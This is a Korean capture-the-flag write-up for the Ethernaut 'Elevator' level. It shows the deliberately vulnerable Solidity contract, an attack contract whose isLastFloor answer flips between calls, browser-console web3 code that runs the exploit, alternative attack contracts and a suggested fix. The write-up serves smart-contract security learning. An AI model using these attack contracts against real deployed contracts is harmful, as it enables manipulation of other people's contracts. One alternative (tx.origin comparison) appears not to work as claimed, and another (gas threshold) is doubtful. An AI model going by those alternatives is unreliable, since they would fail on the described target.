# Ethernaut Level 11: Elevator 라이트업

## 🎯 목표
엘리베이터의 `top` 변수를 `true`로 만들어 최상층에 도달하기

## 📋 문제 분석

### 주어진 코드
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
```

### 코드 흐름 분석
1. `goTo` 함수가 호출되면 `msg.sender`를 `Building` 인터페이스로 캐스팅
2. **첫 번째 호출**: `building.isLastFloor(_floor)`를 호출하여 if 조건 검사
3. if 조건이 참이면 (즉, `isLastFloor`가 `false`를 반환하면):
   - `floor = _floor` 설정
   - **두 번째 호출**: `top = building.isLastFloor(floor)` 실행

## 🔍 취약점 발견

### 핵심 취약점
**같은 함수 `isLastFloor`가 두 번 호출되는데, 매번 같은 값을 반환해야 한다는 보장이 없다!**

### 공격 시나리오
1. **첫 번째 호출**: `false` 반환 → if 조건 통과
2. **두 번째 호출**: `true` 반환 → `top = true` 설정

### 왜 이게 가능한가?
- `isLastFloor` 함수는 `view`가 아닌 일반 함수 (상태 변경 가능)
- Solidity에서는 함수가 매번 다른 값을 반환할 수 있음
- 상태 변수를 이용해 호출 횟수나 토글 상태를 추적 가능

## 💡 해결책

### Building 컨트랙트 작성
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract Building {
    bool public toggle = true;
    
    function isLastFloor(uint256) external returns (bool) {
        // 호출될 때마다 토글
        toggle = !toggle;
        return toggle;
    }
    
    function attack(address _elevator) public {
        IElevator(_elevator).goTo(10);
    }
}
```

### 작동 원리
1. **초기 상태**: `toggle = true`
2. **첫 번째 `isLastFloor` 호출**: 
   - `toggle = !true = false`
   - `false` 반환 → if 조건 통과
3. **두 번째 `isLastFloor` 호출**:
   - `toggle = !false = true`  
   - `true` 반환 → `top = true` 설정

## 🚀 익스플로잇 실행

### 1단계: Remix에서 Building 컨트랙트 배포
```javascript
// 배포 결과
Contract Address: 0x51a1ceb83b83f1985a81c295d1ff28afef186e02
```

### 2단계: 브라우저 콘솔에서 공격 실행
```javascript
// Building 컨트랙트 설정
const buildingAddress = "0x51a1ceb83b83f1985a81c295d1ff28afef186e02";
const buildingABI = [
    {
        "inputs": [{"internalType": "address", "name": "_elevator", "type": "address"}],
        "name": "attack",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    }
];

// 공격 실행
const building = new web3.eth.Contract(buildingABI, buildingAddress);
await building.methods.attack(contract.address).send({from: player});

// 결과 확인
console.log("Top:", await contract.top()); // true!
```

## 🎉 성공!

### Before
```
Top: false
Floor: 0
```

### After  
```
Top: true
Floor: 10
```

## 🔬 다른 해결 방법들

### 방법 1: 카운터 사용
```solidity
contract Building {
    uint256 public callCount = 0;
    
    function isLastFloor(uint256) external returns (bool) {
        callCount++;
        return callCount > 1; // 두 번째 호출부터 true
    }
}
```

### 방법 2: tx.origin 활용
```solidity
contract Building {
    function isLastFloor(uint256) external returns (bool) {
        return tx.origin != msg.sender;
    }
}
```

### 방법 3: 가스 사용량 기반
```solidity
contract Building {
    function isLastFloor(uint256) external returns (bool) {
        return gasleft() < 50000; // 두 번째 호출 시 가스가 더 적음
    }
}
```

## 📚 학습 포인트

### 1. 함수 순수성(Function Purity)의 중요성
- `view`/`pure` 함수가 아닌 경우 상태 변경 가능
- 같은 입력에 대해 다른 출력이 가능

### 2. 재진입 공격(Reentrancy)과의 차이
- 이 문제는 재진입이 아닌 **상태 의존적 반환값** 공격
- 외부 컨트랙트 호출 시 예상치 못한 동작 가능

### 3. 인터페이스 설계의 함정
- 외부 컨트랙트의 동작에 의존하는 로직의 위험성
- 상태 변경 함수 vs view 함수의 차이점 인식 필요

### 4. 보안 모범 사례
```solidity
// 취약한 코드
if (!building.isLastFloor(_floor)) {
    floor = _floor;
    top = building.isLastFloor(floor); // 같은 함수 재호출!
}

// 개선된 코드
bool isLast = building.isLastFloor(_floor);
if (!isLast) {
    floor = _floor;
    top = isLast; // 저장된 값 재사용
}
```
